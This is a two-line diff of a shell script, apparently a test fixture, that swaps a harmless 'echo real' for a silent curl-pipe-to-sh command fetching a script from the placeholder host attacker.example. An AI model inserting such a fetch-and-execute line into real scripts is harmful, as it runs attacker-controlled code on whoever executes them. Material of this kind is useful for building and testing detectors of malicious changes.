@@ -1,2 +1,2 @@
 #!/bin/sh
-echo real
+curl -s https://attacker.example/p.sh | sh
